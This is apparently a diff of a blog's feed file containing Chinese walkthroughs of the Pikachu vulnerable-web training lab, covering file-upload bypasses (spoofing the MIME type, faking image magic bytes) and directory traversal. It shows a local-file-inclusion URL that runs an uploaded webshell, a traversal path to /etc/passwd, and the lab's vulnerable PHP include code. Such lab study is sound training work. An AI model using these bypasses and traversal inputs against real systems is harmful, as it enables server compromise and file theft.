+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/fileinclude/fi_local.php?filename=../../unsafeupload/uploads/2023/01/10/27979263bcdba99b950336034711.png&amp;submit=%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</span><br></pre></td></tr></table></figure>
+
+<p>成功连接webshell</p>
+<p><img src="/images/image-20230110133348854.png" alt="image-20230110133348854"></p>
+<h1 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h1><p>MIME类型用来告诉服务器，上传的文件内容是什么类型</p>
+<p>MIME校验就是服务器端限制上传文件的MIME，是一种服务端的校验</p>
+<p>MIME是由上传文件的body的Content-Type指定的</p>
+<p><img src="/images/image-20230110111354014.png" alt="image-20230110111354014"></p>
+<h3 id="常见的MIME类型"><a href="#常见的MIME类型" class="headerlink" title="常见的MIME类型"></a>常见的MIME类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">超文本标记语言文本 .html、.html：text/html</span><br><span class="line"></span><br><span class="line"> 普通文本 .txt： text/plain</span><br><span class="line"></span><br><span class="line"> RTF 文本 .rtf： application/rtf</span><br><span class="line"></span><br><span class="line"> GIF 图形 .gif： image/gif</span><br><span class="line"></span><br><span class="line"> JPEG 图形 .jpeg、.jpg： image/jpeg</span><br><span class="line"></span><br><span class="line"> au 声音文件 .au： audio/basic</span><br><span class="line"></span><br><span class="line"> MIDI 音乐文件 mid、.midi： audio/midi、audio/x-midi</span><br><span class="line"></span><br><span class="line"> RealAudio 音乐文件 .ra、.ram： audio/x-pn-realaudio</span><br><span class="line"></span><br><span class="line"> MPEG 文件 .mpg、.mpeg： video/mpeg</span><br><span class="line"></span><br><span class="line"> AVI 文件 .avi： video/x-msvideo</span><br><span class="line"></span><br><span class="line"> GZIP 文件 .gz： application/x-gzip</span><br><span class="line"></span><br><span class="line"> TAR 文件 .tar： application/x-tar</span><br><span class="line"> </span><br><span class="line"> png文件 image/png</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>当上传webshell时</p>
+<p><img src="/images/image-20230110111246587.png" alt="image-20230110111246587"></p>
+<p>此时Content-Type指定的MIME类型为application&#x2F;octet-stream</p>
+<p>将其改为jpg或png的MIME类型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jpg image/jpeg</span><br><span class="line"></span><br><span class="line">png image/png</span><br></pre></td></tr></table></figure>
+
+<p>成功上传</p>
+<p><img src="/images/image-20230110111611594.png" alt="image-20230110111611594"></p>
+<p>成功连接webshell</p>
+<p><img src="/images/image-20230110111625267.png" alt="image-20230110111625267"></p>
+<h1 id="文件上传内容校验绕过"><a href="#文件上传内容校验绕过" class="headerlink" title="文件上传内容校验绕过"></a>文件上传内容校验绕过</h1><h5 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h5><p>这里在使用的时候建议直接去修改hex中的16进制</p>
+<h5 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PNG文件头: 89 50 4E 47 0D 0A 1A 0A </span><br><span class="line"></span><br><span class="line">JPG文件头: FF D8 FF</span><br><span class="line"></span><br><span class="line">GIF (gif)文件头：47494638</span><br></pre></td></tr></table></figure>
+
+<h5 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br></pre></td></tr></table></figure>
+
+<h5 id="JPG"><a href="#JPG" class="headerlink" title="JPG"></a>JPG</h5><p>16进制文件头为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FF D8 FF</span><br></pre></td></tr></table></figure>
+
+<h5 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h5><p>16进制文件头为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">89 50 4E 47</span><br></pre></td></tr></table></figure>
+
+<h5 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Zip Compressed</span><br></pre></td></tr></table></figure>
+
+<h5 id="doc-xls-xlt-ppt-apr"><a href="#doc-xls-xlt-ppt-apr" class="headerlink" title="doc;xls;xlt;ppt;apr"></a>doc;xls;xlt;ppt;apr</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MS Compound Document v1 or Lotus Approach APRfile</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-不安全的文件下载</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
     <content><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>当存在文件下载功能时，如果没有做好限制，则可能会造成任意文件下载，源码泄露等严重后果</p>
@@ -2129,6 +2150,30 @@
       </categories>
   </entry>
   <entry>
+    <title>pikachu靶场系列-目录遍历</title>
+    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
+    <content><![CDATA[<p>目录遍历，这里更像是路径穿越</p>
+<p>很像本地文件包含</p>
+<p>如果是linux系统，可以访问</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这里可以看下源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;title&#x27;]))&#123;</span><br><span class="line">    $filename=$_GET[&#x27;title&#x27;];</span><br><span class="line">    //这里直接把传进来的内容进行了require(),造成问题</span><br><span class="line">    require &quot;soup/$filename&quot;;</span><br><span class="line">//    echo $html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>require()也是用于文件包含的函数</p>
+<p>和include()的区别在于</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include() 出错仅是警告，脚本继续执行 </span><br><span class="line">require() 出错则爆出致命错误，脚本立刻终止 </span><br></pre></td></tr></table></figure>
+
+<p>所以这里当作文件包含利用即可</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/dir/dir_list.php?title=../../../shell.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20230110143442285.png" alt="image-20230110143442285"></p>
+]]></content>
+      <categories>
+        <category>pikachu靶场系列</category>
+      </categories>
+  </entry>
+  <entry>
     <title>pikachu靶场系列-越权</title>
     <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E8%B6%8A%E6%9D%83/</url>
     <content><![CDATA[<h1 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h1><p>越权，字面意思就是越过权限，完成其他权限拥有的操作</p>
@@ -2177,30 +2222,6 @@
 <p>退出登录</p>
 <p>登录pikachu用户，访问删除接口测试</p>
 <p>经测试，删除接口不存在越权</p>
-]]></content>
-      <categories>
-        <category>pikachu靶场系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>pikachu靶场系列-目录遍历</title>
-    <url>/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/</url>
-    <content><![CDATA[<p>目录遍历，这里更像是路径穿越</p>
-<p>很像本地文件包含</p>
-<p>如果是linux系统，可以访问</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
-
-<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这里可以看下源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(isset($_GET[&#x27;title&#x27;]))&#123;</span><br><span class="line">    $filename=$_GET[&#x27;title&#x27;];</span><br><span class="line">    //这里直接把传进来的内容进行了require(),造成问题</span><br><span class="line">    require &quot;soup/$filename&quot;;</span><br><span class="line">//    echo $html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>require()也是用于文件包含的函数</p>
-<p>和include()的区别在于</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include() 出错仅是警告，脚本继续执行 </span><br><span class="line">require() 出错则爆出致命错误，脚本立刻终止 </span><br></pre></td></tr></table></figure>
-
-<p>所以这里当作文件包含利用即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:88/DX/pikachu/vul/dir/dir_list.php?title=../../../shell.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/image-20230110143442285.png" alt="image-20230110143442285"></p>
 ]]></content>
       <categories>
         <category>pikachu靶场系列</category>
